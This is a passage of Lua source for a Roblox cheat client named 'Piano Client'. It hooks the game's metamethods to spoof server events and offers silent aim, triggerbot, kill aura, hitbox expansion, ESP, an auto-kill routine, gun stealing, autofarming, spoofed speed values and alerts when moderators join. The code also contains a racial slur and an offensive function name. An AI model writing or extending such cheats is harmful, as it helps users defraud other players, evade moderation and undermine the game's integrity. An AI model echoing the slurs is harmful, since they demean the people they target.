                j=j..i.."="..tostring(v)..";\n"
            elseif typeof(v) == "string" and not v:find("Piano V") then
                j=j..i.."="..'"'..v..'"'..";\n"
            elseif typeof(v) == "nil" then
                j=j..i.."=".."nil"..";\n"
            end
        end
        j = j.."} return saves"
        writefile("Piano Client/config.lua",j)
    end

    function loadsaves()
        if isfile("Piano Client/config.lua") then
            local j = loadstring(readfile('Piano Client/config.lua'))() or loadfile("Piano Client/config.lua")()
            for i,v in pairs(j) do
                if typeof(v) ~= nil then
                    var[i] = v
                else
                    var[i] = nil
                end
            end
            for i,v in pairs(Players:GetPlayers()) do heb(v) end
            if var.fpscap ~= nil then
                setfpscap(var.fpscap)
            end 
            if var.errorsound ~= nil then
                note_4.SoundId = "rbxassetid://"..var.errorsound
            end
            if var.notesize ~= nil then
                l__NoteSample__1.Size = UDim2.new(var.notesize, 0, 0, 40)
            end
            if var.notesound ~= nil then
                note_3.SoundId = "rbxassetid://"..var.notesound
                LocalPlayer.PlayerGui.Client.SFX.note3.SoundId = "rbxassetid://"..var.notesound
                LocalPlayer.PlayerGui.Client.SFX.note2.SoundId = "rbxassetid://"..var.notesound
                LocalPlayer.PlayerGui.Client.SFX.note1.SoundId = "rbxassetid://"..var.notesound
            end
            if var.infhunger then
                LocalPlayer.PlayerData.Hunger.Value = 99
            end
            if var.entesp then
                for i,v in pairs(game:GetService("Workspace").Entities:GetChildren()) do
                    enesp(v)
                end
            end
            if var.printeresp then
                for i,v in pairs(game:GetService("Workspace").MoneyPrinters:GetChildren()) do
                    enesp(v)
                end
            end
            if var.matesp then
                for i,v in pairs(game:GetService("Workspace").Materials:GetChildren()) do
                    enesp(v)
                end
            end
            if var.caresp then
                for i,v in pairs(game:GetService("Workspace").Vehicles:GetChildren()) do
                    enesp(v)
                end
            end
            if var.lootesp and game:GetService("Workspace"):FindFirstChild("Loot") then
                for i,v in pairs(game:GetService("Workspace").Loot:GetChildren()) do
                    enesp(v)
                end
            end
            if var.DB then
                game:GetService("Workspace").FallenPartsDestroyHeight = -math.huge
            end
            TextLabelc.Text = ("Your Prefix: "..var.prefix or "-")
            if var.autoinvisjet then
                LocalPlayer.Character:WaitForChild("Util")
                jet()
            end
            if var.fullb then
                game:GetService("Lighting").GlobalShadows = false
                game:GetService("Lighting").Brightness = 2.4
            end
            if var.playeresp then
                for i,v in pairs(Players:GetPlayers()) do
                    enesp(v.Character,true)
                end 
            end
            if var.ss ~= nil then
                fov.Radius = var.ss
            end
            if var.sss ~= nil then
                fov.NumSides = var.sss
            end
            if var.st ~= nil then
                fov.Thickness = var.st
            end
            if var.saf ~= nil then 
                fov.Filled = var.saf
            end
            if var.ssf ~= nil and var.ss then
                fov.Visible = var.ssf
            end 
            autosg()
            acandad()
            guni()
            bodymods()
            diedtp()
        end
    end

    function getload(variable)
        local b
        if isfile("Piano Client/config.lua") then
            local j = loadstring(readfile('Piano Client/config.lua'))()
            for i,v in ipairs(j) do
                if i == variable then
                    b = v
                    break
                else
                    b = nil
                end
            end
        else
            b = nil
        end
        return b
    end
    
    function func22(Player)
    	if GetGun(LocalPlayer) ~= nil then
    		senderror()
			local oldpos = LocalPlayer.Character:GetPivot()
			local old = var.noclip
			local gundamage = 0
			local gundamage2 = 0
			local breakgundamage = false
			repeat game:GetService("RunService").RenderStepped:Wait() 
				if not GetGun(LocalPlayer).Name:find("Laser Musket") then
					if GetGun(LocalPlayer):GetAttribute("Damage") <= 99.9 and gundamage <= 99.9 then
						gundamage += GetGun(LocalPlayer):GetAttribute("Damage")
						gundamage2 += 1
					else
						breakgundamage = true
					end
				else
					breakdamage = true
					gundamage2 = 1
				end
			until breakgundamage
			for i = 1,gundamage2 do
				
				flagup()
				var.noclip = true
				Tween(Player.Character:GetPivot(), .05)
				task.wait(GetGun(LocalPlayer):GetAttribute("BulletPerSecond"))
			end
			repeat game:GetService("RunService").RenderStepped:Wait()
				flagup()
				var.noclip = true
				Tween(Player.Character:GetPivot(), .05)
				if GetTool(LocalPlayer) ~= nil then
					game:GetService("ReplicatedStorage").Events.MenuActionEvent:FireServer(34,Player.Character.Humanoid,Player.Character:GetPivot())
				end
			until Player.Character:FindFirstChild('Humanoid').Health == 0 or not IsValid(Player) or Player.Character == nil or var.unbreakkill
			var.noclip = old
			Tween(oldpos, .4)
			senderror("Killed "..v.Name)
		else
			senderror("Gun needed")
		end
    end getgenv().rape = func22
    
    function func23()
        local copy = LocalPlayer.Character:WaitForChild("NameTag"):Clone()
        copy.Parent = core
        copy.Name = ""
        if LocalPlayer.Character:FindFirstChild("NameTag"):FindFirstChild("Job") then
            copy.Job.Text = copy.Job.Text.." (Semi Godded)"
        end
        if LocalPlayer.Character:FindFirstChild("NameTag") then
            LocalPlayer.Character.NameTag:Destroy()
        end
    end getgenv().semigod = func23
    
    function func24()
        Instance.new("Model",LocalPlayer.Character:WaitForChild("Util")).Name = "Jetpack"
    end getgenv().jet = func24
    
    function func25(name,type)
        if type == true then
            sendnotification(name:gsub(" ","_").." - Activated")
        elseif type == false then
            sendnotification(name:gsub(" ","_").." - Deactivated")
        end
    end getgenv().togglenote = func25

	function IsNil(instance)
		for i,v in pairs(getnilinstances()) do
			if v == instance then
				return true
			else
				return false
			end
		end
	end

	function CreateESPPart(BodyPart,plr)
        if var.PESPChams then
            local Box = Instance.new("BoxHandleAdornment")
            Box.Size = BodyPart.Size + Vector3.new(.05, .05, .05)
            Box.Name = "this cat is just j2"
            Box.Adornee = BodyPart
            Box.Color3 = GetColor(plr) or Color3.fromRGB(10,10,10)
            Box.AlwaysOnTop = true
            Box.ZIndex = 1
            Box.Transparency = 0.5
            Box.Parent = BodyPart
        else
            if BodyPart:FindFirstChild("this cat is just j2") then
                BodyPart:FindFirstChild("this cat is just j2"):Destroy()
            end
        end
	end
	
	function autosg()
	   local j
	   local k = LocalPlayer.Character:WaitForChild("Humanoid")
	   if var.ASG and k.Health <= var.asghealth then
	       semigod()
	   end 
	   j = k.Changed:Connect(function()
	       if var.ASG and k.Health <= var.asghealth then
	           semigod()
	           j:Disconnect()
	       end
	   end)
	end
	
	function diedtp()
	    local j
	    local old = LocalPlayer.Character:WaitForChild("Humanoid")
	    j = old.Died:Connect(function()
    	        local oldpos = old.Parent:GetPivot()
    	        wait(1)
    	        game:GetService("Workspace"):WaitForChild(LocalPlayer.Name)
    	        LocalPlayer.Character:WaitForChild("HumanoidRootPart")
    	        wait(.4)
    	        if var.diedtp then
    	            Tween(oldpos,.1)
    	        end
            j:Disconnect()
	    end)
	end
	
    function acandad()
        local k
        local j
	    k = LocalPlayer.Character.ChildAdded:Connect(function(v)
            if var.instadrink and v.Name:lower():find("cola") then
                game:GetService("ReplicatedStorage").Events.ToolsEvent:FireServer(4, v)
                LocalPlayer.PlayerGui.Client.ProgressBar.Visible = false
            elseif var.anticlown and v.Name == "1" or v.Name == "2" then
                v:Destroy()
            end
	    end)
	    j = LocalPlayer.Character:WaitForChild("Humanoid").Died:Connect(function()
	        j:Disconnect()
	        k:Disconnect()
	    end)
    end
    
    function heb(v)
        coroutine.wrap(function()
            game:GetService("Workspace"):WaitForChild(v.Name)
            if v ~= LocalPlayer and IsValid(v) and var.HBE then
                local hrp = v.Character:FindFirstChild("HumanoidRootPart")
                hrp.Size = Vector3.new(var.hbesize,var.hbesize,var.hbesize)
                hrp.Color = Color3.fromRGB(var.hbered,var.hbegreen,var.hbeblue)
                hrp.Transparency = var.hbetrans
                hrp.CanCollide = false
            end
            if v ~= LocalPlayer then
                v.CharacterAdded:Connect(function(g)
                    g:WaitForChild("HumanoidRootPart")
                    if var.HBE then
                        local hrp = g:FindFirstChild("HumanoidRootPart")
                        wait(2)
                        hrp.Size = Vector3.new(var.hbesize,var.hbesize,var.hbesize)
                        hrp.Color = Color3.fromRGB(var.hbered,var.hbegreen,var.hbeblue)
                        hrp.Transparency = var.hbetrans
                        hrp.CanCollide = false
                    end
                end)
            end
        end)()
    end
    
    function bodymods()
        local hum = LocalPlayer.Character:WaitForChild("Humanoid")
        local j
        local k
        if var.wsbypass then
            hum.WalkSpeed=var.bypassws
        end
        if var.jpbypass then
            hum.JumpPower=var.bypassjp
        end
        j=hum.Changed:Connect(function()
            if var.wsbypass then
                hum.WalkSpeed=var.bypassws
            end
            if var.jpbypass then
                hum.JumpPower=var.bypassjp
            end
        end)
        k = hum.Died:Connect(function()
            k:Disconnect()
            j:Disconnect()
        end)
    end 

    function guni()
        local a 
        local k 
        local j
        j = LocalPlayer.Character.ChildAdded:Connect(function()
            if var.gunui then
                if LocalPlayer.PlayerData.Karma.Value < 0 then
                    warn.Visible = true
                else
                    warn.Visible = false
                end
                    
                if IsGun(LocalPlayer) then
                    Ammo.Visible = true
                else
                    Ammo.Visible = false
                end
                
                LocalPlayer.PlayerGui.Ammo.Frame.Visible = false
                amt.Text = LocalPlayer.PlayerGui.Ammo.Frame.amt.Text
                type.Text = LocalPlayer.PlayerGui.Ammo.Frame.type.Text
                b = game:GetService("RunService").RenderStepped:Connect(function()
                    amt.Text = LocalPlayer.PlayerGui.Ammo.Frame.amt.Text
                end)
            else
                LocalPlayer.PlayerGui.Ammo.Frame.Visible = true
                Ammo.Visible = false
            end
        end)
        
        k=LocalPlayer.Character.ChildRemoved:Connect(function(v)
            pcall(function()
                if v:FindFirstChild("Handle"):FindFirstChild("Reload") then
                    Ammo.Visible = false
                end
            end)
        end)
        
        a = LocalPlayer.Character:WaitForChild("Humanoid").Died:Connect(function()
            a:Disconnect()
            j:Disconnect()
            k:Disconnect()
        end)
    end
    
    loader("rhehehehehhehehe",UDim2.new(0, 64, 0, 56))
    
    loader("Loading Metamethods, Connects, ifs",UDim2.new(0, 96, 0, 56))
    
    if not isfolder("Piano Client") then
        makefolder("Piano Client")
        sendnotification("1st time using Piano? Welcome.")
    end
    
    LocalPlayer:GetMouse().KeyDown:Connect(function(key)
        if key:byte() == 32 and var.infjump then
            LocalPlayer.Character:WaitForChild("Humanoid"):ChangeState("Jumping")
        end
    end)
    
    LocalPlayer.PlayerGui.Ammo.Frame.amt.Changed:Connect(function(prop)
        if var.reloadtype == "Blatant" then
            if prop == "Text" and GetGun(LocalPlayer) ~= nil and  var.autoreload then wait()
                if IsGun(LocalPlayer) and tostring(GetGun(LocalPlayer).Name):find("Laser Musket") then
                    wait(.5)
                    keypress(0x52)
                    keyrelease(0x52)
                    game:GetService("ReplicatedStorage").Events.WeaponReloadEvent:FireServer(GetGun(LocalPlayer):GetAttribute("AmmoType"), GetGun(LocalPlayer):GetAttribute("MaxAmmo"), GetGun(LocalPlayer))
                else
                    local gun = GetGun(LocalPlayer)
                    if gun ~= nil then
                        game:GetService("ReplicatedStorage").Events.WeaponReloadEvent:FireServer(gun:GetAttribute("AmmoType"), gun:GetAttribute("MaxAmmo"), gun)
                    end
                end
            end
        else 
            if prop == "Text" and var.autoreload then wait()
                if IsGun(LocalPlayer) and LocalPlayer.PlayerGui.Ammo.Frame.amt.Text:split("/")[1] == "0" then
                    keypress(0x52)
                    keyrelease(0x52)
                end
            end
        end
    end)

    LocalPlayer.PlayerData["SMG Ammo"].Changed:Connect(function(v)
        if var.autobuyammo and v <= 60 then
            game:GetService("ReplicatedStorage").Events.MenuEvent:FireServer(2, "SMG Ammo (60x)", nil, 8)
        end
    end)

    LocalPlayer.PlayerData["Heavy Ammo"].Changed:Connect(function(v)
        if var.autobuyammo and v <= 3 then
            game:GetService("ReplicatedStorage").Events.MenuEvent:FireServer(2, "Heavy Ammo (10x)", nil, 8)
        end
    end)

    LocalPlayer.PlayerData["Pistol Ammo"].Changed:Connect(function(v)
        if var.autobuyammo and v <= 30 then
            game:GetService("ReplicatedStorage").Events.MenuEvent:FireServer(2, "Pistol Ammo (30x)", nil, 8)
        end
    end)

    LocalPlayer.PlayerData["Rifle Ammo"].Changed:Connect(function(v)
        if var.autobuyammo and v <= 60 then
            game:GetService("ReplicatedStorage").Events.MenuEvent:FireServer(2, "Rifle Ammo (30x)", nil, 8)
        end
    end)

    LocalPlayer.PlayerData.Hunger.Changed:Connect(function(v)
        if var.infhunger and v ~= 100 then
            LocalPlayer.PlayerData.Hunger.Value = 100
        end
    end)
    
    game:GetService("UserInputService").JumpRequest:Connect(function()
        if var.flyjump then
            LocalPlayer.Character:WaitForChild("Humanoid"):ChangeState("Jumping")
        end
    end)
    
    game:GetService("Workspace").ChildAdded:Connect(function(v)
        if v.Name == "Ragdoll" and var.AntiLag then
            v:Destroy()
        end
        
        if var.AntiNlr and v.Name == "NL" then
            v:Destroy()
        end
    end)
    
    LocalPlayer:GetMouse().Move:Connect(function()
        local mouse = LocalPlayer:GetMouse()
        local hit = mouse.Target
        if var.triggerbot and hit ~= nil and hit.Parent:FindFirstChild("Humanoid") and IsGun(LocalPlayer) and not var.LeftClick then
            mouse1press()
            wait(var.trigrefreshrate)
            mouse1release()
        end
        fov.Position = Vector2.new(game:GetService("UserInputService"):GetMouseLocation().x,game:GetService("UserInputService"):GetMouseLocation().y)
    end)

    game:GetService("Workspace"):WaitForChild("Vehicles").ChildAdded:Connect(function(v)
        if var.AntiCar then
            v:Destroy()
        end
    end)
    
    game:GetService("Workspace").Particles.ChildAdded:Connect(function(v)
        if var.AntiLag and not v.Name:find("BH") then
            v:Destroy()
        end
    end)
    
    game:GetService("Workspace").Entities.ChildAdded:Connect(function(v)
        if (Vector3.new(1.0783619880676, -2.2362022399902, 1.1584800481796) - v:GetPivot().p).magnitude <= 5 or (Vector3.new(0, -999997, 0) - v:GetPivot().p).magnitude <= 10 then
            v:Destroy()
        end
    end)
    
    for i,v in pairs(game:GetService("Workspace").Entities:GetChildren()) do
        if (Vector3.new(1.0783619880676, -2.2362022399902, 1.1584800481796) - v:GetPivot().p).magnitude <= 5 or (Vector3.new(0, -999997, 0) - v:GetPivot().p).magnitude <= 10 then
            v:Destroy()
        end
    end 

    game:GetService("UserInputService").InputBegan:Connect(function(I)
        if I.KeyCode == Enum.KeyCode.RightControl then
            local LibraryUI = commandc
            LibraryUI.Enabled = not LibraryUI.Enabled
        end
    end)
    
    game:GetService("Lighting").Changed:Connect(function()
        if var.fullb then
            game:GetService("Lighting").GlobalShadows = false
            game:GetService("Lighting").Brightness = 2.4
        else
            game:GetService("Lighting").GlobalShadows = true
        end
    end)
    
    for i,v in pairs(Players:GetPlayers()) do
        v.Chatted:Connect(function(msg)
            if var.msglog and msg ~= "I am using piano!"  then
                if identifyexecutor() == "ScriptWare" then
                    rconsolecreate()
                end
                rconsoleprint("@@WHITE@@") rconsoleprint("["..v.Name.."]: ") rconsoleprint('@@LIGHT_BLUE@@') rconsoleprint(msg.."\n")
                wait(.1)
            end
        end)
    end

    Players.PlayerRemoving:Connect(function(v2)
        for i,v in pairs(pianousers) do
            if v == v2.Name then
                table.remove(pianousers,i)
            end 
        end
    end)
    
    Players.PlayerAdded:Connect(function(v)
        v.Chatted:Connect(function(msg)
            if var.msglog and msg ~= "I am using piano!" then
                if identifyexecutor() == "ScriptWare" then
                    rconsolecreate()
                end
                rconsoleprint("@@WHITE@@") rconsoleprint("["..v.Name.."]: ") rconsoleprint('@@LIGHT_BLUE@@') rconsoleprint(msg.."\n")
                wait(.1)
            end
        end)
    end)
    
    chams.ChildAdded:Connect(function(g)
        if not var.Chams then
            g.Visible = false
        end 
    end)

    spawn(function()
        local bruh = game:GetService("Workspace"):WaitForChild("Loot")
        bruh.ChildAdded:Connect(enesp)
    end)
    
    game:GetService("Workspace").Entities.ChildAdded:Connect(function(v)
        if var.IG then
            local oldpos, olddb, oldnoclip = LocalPlayer.Character:GetPivot(), var.DB, var.noclip
            local gr = {"InventoryEvent","InteractEvent"}  
            if v.Name == "Gun" and var.IG and not Stealing and v:FindFirstChild("Handle") and v:WaitForChild("ToolOwner").Value ~= LocalPlayer.Name then
                Stealing = true
                while wait(.1) do
                    local notnil
                    for i,x in pairs(game:GetService("Workspace").Entities:GetChildren()) do
                        if x == v then
                            notnil = true
                        end 
                    end
                    var.DB = true
                    var.noclip = true
                    Tween(CFrame.new(0,-.3,0)*v:FindFirstChild("Handle"):GetPivot()*CFrame.Angles(0,math.rad(90),0),.1)
                    wait(.13)
                    local jr = gr[math.random(1,2)]
                    if LocalPlayer.PlayerGui.Client.Inventory.Slots.Amt.Text == "11/10" then
                        game:GetService("ReplicatedStorage").Events.InteractEvent:FireServer(v)
                    else
                        game:GetService("ReplicatedStorage").Events.InventoryEvent:FireServer(2,v)
                    end
                    if notnil == false or var.IG == false then
                        break 
                    end
                    notnil = false
                end
                Stealing = false
                Tween(oldpos,.1)
                var.DB, var.noclip = olddb, oldnoclip
            end
        end
    end)
    
    game:GetService("Workspace").MoneyPrinters.ChildAdded:Connect(function(v)
        if var.dpfarm then
            if var.dpfarm and v:IsA("Model") and v ~= nil and v:FindFirstChild("Int") and v:FindFirstChild("Int"):FindFirstChild("Uses").Value ~= 0 then
                if LocalPlayer.Job.Value ~= "Soldier" and var.dpfarm then
                    game:GetService("ReplicatedStorage").Events.MenuEvent:FireServer(1, "Soldier")
                    wait(1)
                    game:GetService("Workspace"):WaitForChild(LocalPlayer.Name)
                end
                if LocalPlayer.Job.Value == "Soldier" and not huntingp then
                    huntingp = true
                    Tween(v:GetPivot(), 1)
                    wait(1.5)
                    game:GetService("ReplicatedStorage").Events.ToolsEvent:FireServer(11,v)
                end
                huntingp = false
                wait(8)
            end
        end
    end)
        
    game:GetService("Workspace").Materials.ChildAdded:Connect(function(v)
        if var.materialfarm then
            wait(.5)
            local m = false
            for i,v2 in pairs(workspace.Materials:GetChildren()) do
                if v2 == v then
                    m = true
                end 
            end 
            if var.materialfarm and m ~= false then
                v:FindFirstChild("TrueOwner"):FindFirstChild('Locked').Value = false
                Tween(v:GetPivot(), .3)
                wait(.1)
                game:GetService("ReplicatedStorage").Events.PickUpEvent:FireServer(v,true)
                for i2,v2 in pairs(game:GetService("Workspace").Buildings:GetDescendants()) do
                    if v2.Name:find("Cargo Station") then
                        wait(.1)
                        game:GetService("ReplicatedStorage").Events.MenuActionEvent:FireServer(41,v2,v)
                    end 
                end
            end
            local m = false
        end
    end)
    
    Players.PlayerAdded:Connect(function(v)
        v.CharacterAdded:Connect(function()
            workspace:WaitForChild(v.Name,math.huge):WaitForChild("Humanoid",math.huge)
            heb(v)
            enesp(v.Character,true)
        end)
    end)

    game:GetService("Workspace").ChildAdded:Connect(function(g)
        if g.Name == "Loot" then
            g.ChildAdded:Connect(enesp)
        end
    end)
    
    game:GetService("Workspace").Materials.ChildAdded:Connect(enesp)
    
    game:GetService("Workspace").Vehicles.ChildAdded:Connect(enesp)

    game:GetService("Workspace").MoneyPrinters.ChildAdded:Connect(enesp)

    game:GetService("Workspace").Entities.ChildAdded:Connect(enesp)

    game:GetService("Workspace").Buildings.DescendantAdded:Connect(function(v)
        if v.Name:find("Banker") then
            enesp(v)
        end
    end)

    LocalPlayer.Chatted:Connect(function(msgkik)
        if msgkik == "-identify others" then
            for i,v in pairs(pianousers) do
                sendnotification(v.." Is using "..var.ver)
            end
        end
    end)
    
    Players.PlayerAdded:Connect(function(plr)
        plr.Chatted:Connect(function(msg)
            if var.ctroll and msg ~= "I am using piano!" then
                msgg = "["..plr.Name.."]: "..msg
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/ad "..msgg:gsub("/ad","(ADVERT)"), "All")
            end
        end)
        if table.find(ingamemods,plr.Name) then
            senderror("In-game Moderator ("..plr.Name..") joined!")
        end
    end)

    LocalPlayer:GetMouse().Button1Down:Connect(function()
        if var.Clicktp and var.ctpbind ~= nil and game:GetService("UserInputService"):IsKeyDown(var.ctpbind) then
            Tween(LocalPlayer:GetMouse().Hit, .05)
        end
    end)

    game:GetService("UserInputService").InputBegan:Connect(function(g, j)
        if var.noclip1 and g.KeyCode == var.nckey and not j then
            var.noclip = not var.noclip
        end 
        if var.Walkspeed and g.KeyCode == var.WalkspeedBind and not j then
            var.uiop = true
        end
        if var.lag and g.KeyCode == var.lagbind and not j then
            settings():GetService("NetworkSettings").IncomingReplicationLag = var.laga * 3
        end
        if g.UserInputType == Enum.UserInputType.MouseButton1 then
            var.LeftClick = true
        end
    end)
    
    LocalPlayer.CharacterAdded:Connect(function()
        autosg()
        acandad()
        diedtp()
        guni()
        bodymods()
        if var.autoinvisjet then
            LocalPlayer.Character:WaitForChild("Util")
            jet()
        end
    end)
    
    game:GetService("UserInputService").InputEnded:Connect(function(g, j)
        if g.UserInputType == Enum.UserInputType.MouseButton1 then
            var.LeftClick = false
        end
        if g.KeyCode == var.WalkspeedBind and not j then
            var.uiop = false
        end
        if g.KeyCode == var.lagbind and not j then
           settings():GetService("NetworkSettings").IncomingReplicationLag = 0 
        end
    end)

    LocalPlayer:GetMouse().KeyDown:Connect(function(key)
        if key:byte() == var.prefix:byte() then
            wait()
            TextcBoxc:CaptureFocus()
        end
    end)
    
    for i,v in pairs(Players:GetPlayers()) do
        v.Chatted:Connect(function(msg)            
            if var.ctroll and msg ~= "I am using piano!" then
                msgg = "["..v.Name.."]: "..msg
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/ad "..msgg:gsub("/ad","(ADVERT)"), "All")
            end
        end)
        
        if table.find(ingamemods,v.Name) then
            senderror("In-game Moderator ("..v.Name..") is here!")
        end
    end
    
    for i,v in pairs(Players:GetPlayers()) do
        pcall(function()
            enesp(v.Character,true)
        end)
    end 
    
    if not Drawing then
        senderror("Exploit will not run ESPs")
    end

    if not debug then
        senderror("Exploit will not run debug")
    end

    if not hookmetamethod then
        senderror("Exploi will not run metamethods")
    end

    if not rconsoleprint then
        senderror("Exploit will not run remote console")
    end

    -- METATABLES N SHIT

    old_namecall = hookmetamethod(game, "__namecall", function(...)
        local args = {...}
        local _self = args[1]
        local method = getnamecallmethod()
    
        if var.DB and method == "Destroy" and _self == LocalPlayer.Character.Humanoid then
            return nil
        end
        
        if var.wwmw and method == "FireServer" and args[2] == 33 and _self == game.ReplicatedStorage.Events.MenuActionEvent and tostring(args[5]):find("Humanoid") and args[10] ~= "nigger" then
            spawn(function()
                for i = 1,tonumber(var.rounds) do wait(var.roundtime)
                    game:GetService("ReplicatedStorage").Events.MenuActionEvent:FireServer(33,args[3],2,args[5],GetGun(LocalPlayer):GetAttribute("Damage"),GetGun(LocalPlayer),nil,1,"nigger")
                    CreateBulletHole(args[5].Parent:GetPivot() or args[3],2)
                    HitMarker(args[5].Parent:FindFirstChild("HumanoidRootPart").CFrame,GetGun(LocalPlayer):GetAttribute("Damage"))
                end
            end)
            return _self.FireServer(...)
        end
        
        if var.instalockpick and args[2] == 9 and _self:GetFullName():find("ToolsEvent") then
            game:GetService("ReplicatedStorage").Events.ToolsEvent:FireServer(1,args[3])
            return _self.FireServer(...)
        end

        if var.loudaim and method == "FireServer" and _self == game.ReplicatedStorage.Events.MenuActionEvent and args[2] == 33 then
            mpibself(var.loudaimsound)
            return _self.FireServer(...)
        end
        
        if var.loudaim and method == "FireServer" and _self == game.ReplicatedStorage.Events.mpib and args[3] ~= var.loudaimsound then
            args[3] = var.loudaimsound
            return _self.FireServer(unpack(args))
        end

        if var.silentaim and method == "FireServer" and _self == game.ReplicatedStorage.Events.MenuActionEvent and args[2] == 33 and args[5] == nil and sel ~= LocalPlayer and sel ~= nil then
            args[3] = sel.Character:GetPivot()
            args[5] = sel.Character.Humanoid
            return _self.FireServer(unpack(args))
        end
        
        if method == "SetCoreGuiEnabled" and args[2] == Enum.CoreGuiType.Backpack and args[3] == false then
            args[3] = true
            return _self.SetCoreGuiEnabled(unpack(args))
        end
        
        if method == "Shake" and var.pee then
            return nil
        end
        
        return old_namecall(...)
    end)

    old_index = hookmetamethod(game,"__index",function(...)
        local args = {...}
        local instance = args[1]
        local key = args[2]

        if key == "WalkSpeed" then
            return 16
        end

        if key == "JumpPower" then
            return 50
        end

        return old_index(...)
    end)
    
    loader("Loading UI",UDim2.new(0, 128, 0, 56))

    loadsaves()
    
    -- Combat
    
    local lib = newlib(var.ver)
    
    local Main = lib.WindowTab('Main')
    
    local combattab = Main.SideTab("Combat",2.76)
    
    local Combatw = combattab.Section("Silent Aim Settings")

    Combatw.Toggle("Silent Aim",var.silentaim,function(a)
        var.silentaim = a
        togglenote("Silent Aim",var.silentaim)
        if var.ssf and a then
            fov.Visible = a
        end 
    end)

    Combatw.Slider("Silent Aim Radius",1,1000,var.ss,false,function(a)
        var.ss = a
        fov.Radius = a
    end)

    Combatw.Toggle("Silent Aim FOV",var.ssf,function(a)
        var.ssf = a
        fov.Visible = a
    end)
    
    Combatw.Slider("Silent Aim FOV Sides",3,125,var.sss,false,function(a)
        var.sss = a
        fov.NumSides = a
    end)
    
    Combatw.Toggle("Silent Aim FOV Filled",var.saf,function(a)
        var.saf = a 
        fov.Filled = a
        togglenote("Silent Aim FOV Filled",var.saf)
    end)
    
    Combatw.Slider("Silent Aim FOV Thickness",1,100,var.st,false,function(a)
        var.st = a
        fov.Thickness = a
    end)

    Combatw.Label("Combat")

    Combatw.Toggle("Triggerbot",var.triggerbot,function(a)
        var.triggerbot = a
        togglenote("Triggerbot",var.triggerbot)
    end)

    Combatw.Slider("Triggerbot Release Time",0,50,var.trigrefreshrate,true,function(a)
        var.trigrefreshrate = a
    end)

    Combatw.Toggle("Auto Buy Ammo",var.autobuyammo,function(a)
        var.autobuyammo = a
        togglenote("Auto Buy Ammo",var.autobuyammo)
    end)
    
    Combatw.Toggle("Auto Reload",var.autoreload,function(a)
        var.autoreload = a
        togglenote("Auto Reload",var.autoreload)
    end)
    
    Combatw.Dropdown("Auto Reload Type",{"Blatant","Keypress"},function(a)
        var.reloadtype = a
    end)
    
    Combatw.Toggle("Heal Aura",var.healaura,function(a)
        var.healaura = a
        togglenote("Heal Aura",var.healaura)
    end)
    
    Combatw.Toggle("Kill Aura",var.killaura,function(a)
        var.killaura = a
        togglenote("Kill Aura",var.killaura)
    end)
    
    Combatw.Slider("Killaura Range",1,200,var.kara,true,function(a)
        var.kara = a
    end)
    
    Combatw.Slider("Killaura Fire Time",0,5,var.kaft,true,function(a)
        var.kaft = a
    end)
    
    Combatw.Dropdown("Killaura Targets",{"Red Names","Yellow Names","Both"}, function(a)
        var.killauratargets = a
        sendnotification("Killaura Targets - "..var.killauratargets)
    end)
    
    Combatw.Button("No Spread",function()
        for i,v in pairs(debug.getupvalues(getrenv()._G.CSH, 1)) do
            if typeof(v) == "table" then
                for i2,v2 in pairs(v) do
                    if i2 == "Shake" then
                        v[i2] = function()end
                    end
                end
            end
        end
        sendnotification("You now will have no spread when shooting")
    end)

    Combatw.Label("Hitbox Expander Settings")

    Combatw.Toggle("Hitbox Expander",var.HBE,function(a)
        var.HBE = a
        togglenote("Hitbox Expander",var.HBE)
        if a then
            for i,v in pairs(Players:GetPlayers()) do
                if IsValid(v) and v ~= LocalPlayer then
                    local hrp = v.Character:FindFirstChild("HumanoidRootPart")
                    hrp.Size = Vector3.new(var.hbesize,var.hbesize,var.hbesize)
                    hrp.Color = Color3.fromRGB(var.hbered,var.hbegreen,var.hbeblue)
                    hrp.Transparency = var.hbetrans
                    hrp.CanCollide = false
                end
            end
        else
            for i,v in pairs(Players:GetPlayers()) do
                if not var.HBE and IsValid(v) and v.Character:FindFirstChild("HumanoidRootPart").Size == Vector3.new(var.hbesize,var.hbesize,var.hbesize) then
                    local hrp = v.Character:FindFirstChild("HumanoidRootPart")
                    hrp.Size = Vector3.new(1,1,1)
                    hrp.Transparency = 1 - 1 + 1 * 1
                    hrp.CanCollide = false
                end
            end
        end
    end)

    Combatw.Slider("Hitbox Expander Size",1,200,var.hbesize,true,function(a)
        var.hbesize = a
        for i,v in pairs(Players:GetPlayers()) do
            if var.HBE then
                if IsValid(v) and v ~= LocalPlayer and not v.Character:FindFirstChild("Humanoid").Sit then
                    local hrp = v.Character:FindFirstChild("HumanoidRootPart")
                    hrp.Size = Vector3.new(var.hbesize,var.hbesize,var.hbesize)
                    hrp.Color = Color3.fromRGB(var.hbered,var.hbegreen,var.hbeblue)
                    hrp.Transparency = var.hbetrans
                    hrp.CanCollide = false
                end
            end
        end
    end)

    Combatw.Slider("Hitbox Expander Transparancy",0,1,var.hbetrans,true,function(a)
        var.hbetrans = a
        for i,v in pairs(Players:GetPlayers()) do
            if var.HBE then
                if IsValid(v) and v ~= LocalPlayer and not v.Character:FindFirstChild("Humanoid").Sit then
                    local hrp = v.Character:FindFirstChild("HumanoidRootPart")
                    hrp.Size = Vector3.new(var.hbesize,var.hbesize,var.hbesize)
                    hrp.Color = Color3.fromRGB(var.hbered,var.hbegreen,var.hbeblue)
                    hrp.Transparency = var.hbetrans
                    hrp.CanCollide = false
                end
            end
        end
    end)

    Combatw.Slider("Hitbox Expander Color Red",0,255,var.hbered,false,function(a)
        var.hbered = a
        for i,v in pairs(Players:GetPlayers()) do
            if var.HBE then
                if IsValid(v) and v ~= LocalPlayer and not v.Character:FindFirstChild("Humanoid").Sit then
                    local hrp = v.Character:FindFirstChild("HumanoidRootPart")
                    hrp.Size = Vector3.new(var.hbesize,var.hbesize,var.hbesize)
                    hrp.Color = Color3.fromRGB(var.hbered,var.hbegreen,var.hbeblue)
                    hrp.Transparency = var.hbetrans
                    hrp.CanCollide = false
                end
            end
        end
    end)

    Combatw.Slider("Hitbox Expander Color Green",0,255,var.hbegreen,false,function(a)
        var.hbegreen = a
        for i,v in pairs(Players:GetPlayers()) do
            if var.HBE then
                if IsValid(v) and v ~= LocalPlayer and not v.Character:FindFirstChild("Humanoid").Sit then
                    local hrp = v.Character:FindFirstChild("HumanoidRootPart")
                    hrp.Size = Vector3.new(var.hbesize,var.hbesize,var.hbesize)
                    hrp.Color = Color3.fromRGB(var.hbered,var.hbegreen,var.hbeblue)
